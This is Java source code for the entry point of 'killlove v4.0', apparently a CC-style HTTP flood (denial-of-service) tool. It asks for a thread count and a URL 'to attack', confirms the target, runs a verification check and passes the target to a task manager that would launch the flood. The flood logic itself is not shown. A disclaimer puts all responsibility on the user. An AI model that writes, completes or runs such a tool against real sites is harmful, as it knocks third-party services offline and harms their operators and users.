package com.luo123.killlove;


import java.net.MalformedURLException;
import java.util.Scanner;



public class Main  {

    public static String strUrl = null;

    private static Scanner scanner = new Scanner(System.in);

    public static void main(String[] args) throws MalformedURLException {
        int threadNum, b = 0;
        String urls , ths ;
        System.out.println("");
        System.out.println("killlove v4.0商业版 by:luo123 ");
        System.out.println("使用本软件造成的一切后果由使用者承担，作者不承担一切责任");
        try {
            urls = args[0];

        } catch (Exception e) {
            urls = "n";
        }
        try{
            ths =args[1];

        }catch (Exception e){
            ths = "n";

        }


              if (urls.equals("n") && ths.equals("n")) {

                  System.out.println("请输入线程数:");
                  threadNum = scanner.nextInt();
                  System.out.println("请输入要攻击的URL:");
                  String str = scanner.next();
                  ctask(str, threadNum, 0);

              } else {
                  try {
                      b = Integer.valueOf(ths).intValue();

                  } catch (NumberFormatException e) {
                      System.out.println("线程数不正确,请重新输入");
                      System.exit(0);
                  }
                  ctask(urls, b, 1);
              }
          }






    private static void ctask (String str , int threadNum ,int st) {


        if (!str.startsWith("")) {
            strUrl = "http://" + str;
            System.out.println(strUrl);
        } else {
            strUrl = str;
        }

        System.out.println("--------------------------------------");
        System.out.println("线程数:" + threadNum);
        System.out.println("攻击URL: " + str);
        if (st == 0) {
            System.out.println("请再次确认(Y/N):");
            String tmp = scanner.next();
            if ("Y".equalsIgnoreCase(tmp)) {


             if (Safety.Verification(str) == true){//安全验证

                 TaskManager.getTm().addtask(1,threadNum,str);
           //通过
             }else{
                 System.out.println("非法使用");
                 System.exit(1);//不通过
             }


           //输入n
            } else if ("N".equalsIgnoreCase(tmp)) {
            } else {
                System.out.println("输入错误,请重新输入(Y/N):");

           System.exit(0);
            }
        }else {
            if (Safety.Verification(str) == true){//安全验证

                TaskManager.getTm().addtask(1,threadNum,str);
                //通过
            }else {
                System.out.println("非法使用");
                System.exit(1);//不通过

            }

        }

    }
//手动启动cc



    }









